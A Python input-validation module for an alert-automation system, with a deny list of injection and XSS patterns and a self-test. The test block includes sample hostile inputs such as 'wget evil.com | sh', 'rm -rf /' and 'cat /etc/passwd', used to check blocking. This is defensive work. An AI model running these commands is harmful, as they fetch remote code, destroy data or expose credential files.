#!/usr/bin/env python3
"""
Input Validation Module for Phase 3 Components

Provides comprehensive input validation and sanitization for alert contexts,
diagnostic results, and all user inputs to prevent injection attacks and
ensure data integrity.

Author: Claude Code Integration - Phase 3 Security
Date: 2025-08-21
"""

import json
import re
import logging
from typing import Dict, List, Any, Optional, Union
from datetime import datetime
import jsonschema

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class InputValidator:
    """
    Comprehensive input validation and sanitization for Phase 3 automation.
    
    Features:
    - JSON schema validation
    - SQL injection prevention
    - Command injection prevention
    - XSS prevention
    - Data type validation
    - String sanitization
    """
    
    def __init__(self):
        """Initialize input validator with schemas."""
        self.alert_context_schema = self._get_alert_context_schema()
        self.diagnostic_results_schema = self._get_diagnostic_results_schema()
        self.ssh_config_schema = self._get_ssh_config_schema()
        
        # Dangerous patterns for security validation
        self.dangerous_patterns = [
            r'[\$`]',                    # Command substitution
            r'[;&|]',                    # Command chaining
            r'\.\./',                    # Directory traversal
            r'<script[^>]*>',           # XSS script tags
            r'javascript:',             # JavaScript URLs
            r'data:.*base64',           # Data URLs
            r'union\s+select',          # SQL injection
            r'drop\s+table',            # SQL injection
            r'exec\s*\(',              # Code execution
            r'eval\s*\(',              # Code execution
            r'system\s*\(',            # System calls
            r'/etc/passwd',            # Sensitive files
            r'/etc/shadow',            # Sensitive files
            r'rm\s+-rf',               # Destructive commands
        ]

    def _get_alert_context_schema(self) -> Dict[str, Any]:
        """Get JSON schema for alert context validation."""
        return {
            "type": "object",
            "required": ["alert_id", "check_id", "severity", "timestamp"],
            "properties": {
                "alert_id": {
                    "type": "string",
                    "pattern": "^[a-zA-Z0-9_-]+$",
                    "maxLength": 100
                },
                "check_id": {
                    "type": "string",
                    "pattern": "^S[0-9]+-[a-zA-Z0-9_-]+$",
                    "maxLength": 50
                },
                "severity": {
                    "type": "string",
                    "enum": ["critical", "warning", "info"]
                },
                "status": {
                    "type": "string",
                    "enum": ["triggered", "resolved", "acknowledged"]
                },
                "timestamp": {
                    "type": "string",
                    "format": "date-time"
                },
                "message": {
                    "type": "string",
                    "maxLength": 1000
                },
                "environment": {
                    "type": "string",
                    "enum": ["production", "staging", "development", "test"]
                },
                "details": {
                    "type": "object",
                    "additionalProperties": True
                }
            },
            "additionalProperties": False
        }

    def _get_diagnostic_results_schema(self) -> Dict[str, Any]:
        """Get JSON schema for diagnostic results validation."""
        return {
            "type": "object",
            "properties": {
                "health_analysis": {"type": "object"},
                "metrics_analysis": {"type": "object"},
                "log_analysis": {"type": "object"},
                "dependency_analysis": {"type": "object"},
                "intelligence_synthesis": {"type": "object"},
                "timestamp": {
                    "type": "string",
                    "format": "date-time"
                }
            },
            "additionalProperties": True
        }

    def _get_ssh_config_schema(self) -> Dict[str, Any]:
        """Get JSON schema for SSH configuration validation."""
        return {
            "type": "object",
            "required": ["host", "user", "key_path"],
            "properties": {
                "host": {
                    "type": "string",
                    "pattern": "^[a-zA-Z0-9.-]+$",
                    "maxLength": 255
                },
                "user": {
                    "type": "string",
                    "pattern": "^[a-zA-Z0-9_-]+$",
                    "maxLength": 32
                },
                "key_path": {
                    "type": "string",
                    "maxLength": 500
                },
                "port": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": 65535
                }
            },
            "additionalProperties": False
        }

    def sanitize_string(self, value: str, max_length: int = 1000) -> str:
        """
        Sanitize string input by removing dangerous characters and patterns.
        
        Args:
            value: Input string to sanitize
            max_length: Maximum allowed length
            
        Returns:
            Sanitized string
        """
        if not isinstance(value, str):
            raise ValueError("Input must be a string")
        
        # Truncate to max length
        if len(value) > max_length:
            logger.warning(f"String truncated from {len(value)} to {max_length} characters")
            value = value[:max_length]
        
        # Check for dangerous patterns
        for pattern in self.dangerous_patterns:
            if re.search(pattern, value, re.IGNORECASE):
                logger.warning(f"Dangerous pattern detected and removed: {pattern}")
                value = re.sub(pattern, '', value, flags=re.IGNORECASE)
        
        # Remove control characters except newlines and tabs
        value = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', value)
        
        # Normalize whitespace
        value = re.sub(r'\s+', ' ', value).strip()
        
        return value

    def validate_json_input(self, json_str: str, schema: Dict[str, Any]) -> Dict[str, Any]:
        """
        Validate and parse JSON input against schema.
        
        Args:
            json_str: JSON string to validate
            schema: JSON schema for validation
            
        Returns:
            Parsed and validated JSON object
            
        Raises:
            ValueError: If JSON is invalid or doesn't match schema
        """
        # Basic JSON parsing
        try:
            data = json.loads(json_str)
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON format: {str(e)}")
        
        # Schema validation
        try:
            jsonschema.validate(data, schema)
        except jsonschema.ValidationError as e:
            raise ValueError(f"JSON schema validation failed: {str(e)}")
        
        # Recursive sanitization of string values
        sanitized_data = self._sanitize_json_object(data)
        
        return sanitized_data

    def _sanitize_json_object(self, obj: Any) -> Any:
        """Recursively sanitize all string values in a JSON object."""
        if isinstance(obj, dict):
            return {key: self._sanitize_json_object(value) for key, value in obj.items()}
        elif isinstance(obj, list):
            return [self._sanitize_json_object(item) for item in obj]
        elif isinstance(obj, str):
            return self.sanitize_string(obj)
        else:
            return obj

    def validate_alert_context(self, alert_context: Union[str, Dict[str, Any]]) -> Dict[str, Any]:
        """
        Validate alert context input.
        
        Args:
            alert_context: Alert context as JSON string or dict
            
        Returns:
            Validated and sanitized alert context
        """
        if isinstance(alert_context, str):
            return self.validate_json_input(alert_context, self.alert_context_schema)
        elif isinstance(alert_context, dict):
            # Convert to JSON string and back for consistent validation
            json_str = json.dumps(alert_context)
            return self.validate_json_input(json_str, self.alert_context_schema)
        else:
            raise ValueError("Alert context must be a JSON string or dictionary")

    def validate_diagnostic_results(self, diagnostic_results: Union[str, Dict[str, Any]]) -> Dict[str, Any]:
        """
        Validate diagnostic results input.
        
        Args:
            diagnostic_results: Diagnostic results as JSON string or dict
            
        Returns:
            Validated and sanitized diagnostic results
        """
        if isinstance(diagnostic_results, str):
            return self.validate_json_input(diagnostic_results, self.diagnostic_results_schema)
        elif isinstance(diagnostic_results, dict):
            json_str = json.dumps(diagnostic_results)
            return self.validate_json_input(json_str, self.diagnostic_results_schema)
        else:
            raise ValueError("Diagnostic results must be a JSON string or dictionary")

    def validate_ssh_config(self, ssh_config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Validate SSH configuration.
        
        Args:
            ssh_config: SSH configuration dictionary
            
        Returns:
            Validated and sanitized SSH configuration
        """
        json_str = json.dumps(ssh_config)
        return self.validate_json_input(json_str, self.ssh_config_schema)

    def validate_command(self, command: str) -> str:
        """
        Validate and sanitize SSH command.
        
        Args:
            command: SSH command to validate
            
        Returns:
            Sanitized command
            
        Raises:
            ValueError: If command contains dangerous patterns
        """
        if not isinstance(command, str):
            raise ValueError("Command must be a string")
        
        # Check command length
        if len(command) > 500:
            raise ValueError("Command too long (max 500 characters)")
        
        # Check for dangerous patterns
        for pattern in self.dangerous_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                raise ValueError(f"Command contains dangerous pattern: {pattern}")
        
        # Sanitize the command
        sanitized_command = self.sanitize_string(command, max_length=500)
        
        # Verify command is not empty after sanitization
        if not sanitized_command.strip():
            raise ValueError("Command is empty after sanitization")
        
        return sanitized_command

    def validate_file_path(self, file_path: str) -> str:
        """
        Validate file path for security.
        
        Args:
            file_path: File path to validate
            
        Returns:
            Validated file path
            
        Raises:
            ValueError: If path is unsafe
        """
        if not isinstance(file_path, str):
            raise ValueError("File path must be a string")
        
        # Check for directory traversal
        if '..' in file_path:
            raise ValueError("Directory traversal not allowed in file paths")
        
        # Check for absolute paths to sensitive directories
        sensitive_dirs = ['/etc/', '/root/', '/home/', '/var/', '/sys/', '/proc/']
        for sensitive_dir in sensitive_dirs:
            if file_path.startswith(sensitive_dir):
                raise ValueError(f"Access to {sensitive_dir} not allowed")
        
        # Sanitize path
        sanitized_path = self.sanitize_string(file_path, max_length=500)
        
        return sanitized_path

    def create_safe_execution_context(self, raw_inputs: Dict[str, Any]) -> Dict[str, Any]:
        """
        Create a safe execution context by validating all inputs.
        
        Args:
            raw_inputs: Dictionary of raw inputs to validate
            
        Returns:
            Dictionary of validated and sanitized inputs
        """
        safe_context = {}
        
        # Validate alert context if present
        if 'alert_context' in raw_inputs:
            safe_context['alert_context'] = self.validate_alert_context(
                raw_inputs['alert_context']
            )
        
        # Validate diagnostic results if present
        if 'diagnostic_results' in raw_inputs:
            safe_context['diagnostic_results'] = self.validate_diagnostic_results(
                raw_inputs['diagnostic_results']
            )
        
        # Validate SSH config if present
        if 'ssh_config' in raw_inputs:
            safe_context['ssh_config'] = self.validate_ssh_config(
                raw_inputs['ssh_config']
            )
        
        # Validate commands if present
        if 'commands' in raw_inputs:
            safe_commands = []
            for cmd in raw_inputs['commands']:
                safe_commands.append(self.validate_command(cmd))
            safe_context['commands'] = safe_commands
        
        # Validate file paths if present
        if 'file_paths' in raw_inputs:
            safe_paths = []
            for path in raw_inputs['file_paths']:
                safe_paths.append(self.validate_file_path(path))
            safe_context['file_paths'] = safe_paths
        
        return safe_context


# Example usage and testing
if __name__ == '__main__':
    validator = InputValidator()
    
    # Test alert context validation
    test_alert = {
        "alert_id": "test-alert-123",
        "check_id": "S1-health-check",
        "severity": "critical",
        "timestamp": "2025-08-21T12:00:00Z",
        "message": "Test alert message"
    }
    
    # Test malicious inputs
    malicious_inputs = [
        "test; rm -rf /",
        "test $(cat /etc/passwd)",
        "test && wget evil.com/script.sh | sh",
        "test' OR 1=1 --",
        "<script>alert('xss')</script>",
    ]
    
    print("Testing Input Validator")
    print("=" * 40)
    
    # Test valid alert context
    try:
        validated_alert = validator.validate_alert_context(test_alert)
        print("✅ Valid alert context passed validation")
    except ValueError as e:
        print(f"❌ Valid alert context failed: {e}")
    
    # Test malicious inputs
    print("\nTesting malicious input detection:")
    for malicious_input in malicious_inputs:
        try:
            sanitized = validator.sanitize_string(malicious_input)
            print(f"🔍 Input: {malicious_input}")
            print(f"🛡️ Sanitized: {sanitized}")
        except Exception as e:
            print(f"❌ Error processing: {e}")
    
    # Test command validation
    print("\nTesting command validation:")
    safe_commands = ["uptime", "systemctl status nginx", "docker ps"]
    unsafe_commands = ["rm -rf /", "cat /etc/passwd", "wget evil.com | sh"]
    
    for cmd in safe_commands + unsafe_commands:
        try:
            validated_cmd = validator.validate_command(cmd)
            print(f"✅ Command allowed: {cmd}")
        except ValueError as e:
            print(f"❌ Command blocked: {cmd} - {e}")